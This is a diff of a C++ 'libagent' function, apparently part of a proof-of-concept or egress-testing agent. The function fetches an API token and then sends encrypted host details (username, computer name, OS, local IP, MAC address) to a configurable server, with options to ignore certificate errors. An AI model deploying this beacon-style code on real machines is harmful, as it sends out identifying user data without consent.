@@ -33,7 +33,7 @@
 
 #include <iostream>
 
-void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring requestMethod, std::wstring tokenuri,
+void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring token_uri_method, std::wstring logclient_uri_method, std::wstring tokenuri,
 	std::wstring logclienturi, std::set<std::wstring> uagents, WORD clientid, std::string secret, std::string username,
 	std::string password, std::string aespassword, std::string PoC_KEYWORD, bool IGNORE_CERT_UNKNOWN_CA, bool IGNORE_CERT_DATE_INVALID, bool HTTPS_CONNECTION) {
 
@@ -62,10 +62,7 @@ void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring req
 	}
 
 	if (!HTTPS_CONNECTION) {
-		std::wcout << "[HTTP] " << "Requesting API token with HTTP packet" << std::endl;
-	}
-	else {
-		std::wcout << "[HTTPS] " << "Requesting API token with HTTPS packet" << std::endl;
+		std::wcout << "[HTTP] " << "Warning! Transmitting unencrypted data over HTTP" << std::endl;
 	}
 
 	if (!HTTPS_CONNECTION) {
@@ -76,7 +73,7 @@ void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring req
 	}
 
 	if (connection != NULL) {
-		request = libhttp::json_request(connection, requestMethod, tokenuri, (char*)token_data.c_str(), token_headers, IGNORE_CERT_UNKNOWN_CA,
+		request = libhttp::json_request(connection, token_uri_method, tokenuri, (char*)token_data.c_str(), token_headers, IGNORE_CERT_UNKNOWN_CA,
 			IGNORE_CERT_DATE_INVALID, HTTPS_CONNECTION);
 	}
 
@@ -122,8 +119,10 @@ void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring req
 		}
 		else {
 
-			std::string encrypted_data = "data=" + libcrypt::encrypt(aespassword, "uid=" + uid + "&computername=" + computername + "&os=" + osversion + "&username=" + username +
-				"&localipaddress=" + ipaddress + "&physicaladdress=" + macaddress) + "&PoC_KEYWORD=" + PoC_KEYWORD;
+			std::string encrypted_data = "data=" + libcrypt::encrypt(aespassword, "UID=" + uid + "&ComputerName=" + computername +
+				"&OS=" + osversion + "&Username=" + username +
+				"&LocalIPAddress=" + ipaddress + "&PhysicalAddress=" + macaddress +
+				"&PoCKEYWORD=" + PoC_KEYWORD + "&Protocol=" + (HTTPS_CONNECTION ? "HTTPS" : "HTTP"));
 
 			std::string encoded = libencode::url_encode(encrypted_data);
 			encrypted_data = "";
@@ -136,7 +135,7 @@ void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring req
 			}
 
 			if (connection != NULL) {
-				request = libhttp::json_request(connection, requestMethod, logclienturi, (char*)encoded.c_str(),
+				request = libhttp::json_request(connection, logclient_uri_method, logclienturi, (char*)encoded.c_str(),
 					logclient_headers.c_str(), IGNORE_CERT_UNKNOWN_CA, IGNORE_CERT_DATE_INVALID, HTTPS_CONNECTION);
 			}
 
@@ -170,8 +169,10 @@ void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring req
 				}
 			}
 
-			HeapFree(GetProcessHeap(), 0, downloaded);
-			downloaded = NULL;
+			if (downloaded) {
+				HeapFree(GetProcessHeap(), 0, downloaded);
+				downloaded = NULL;
+			}
 		}
 	}
 
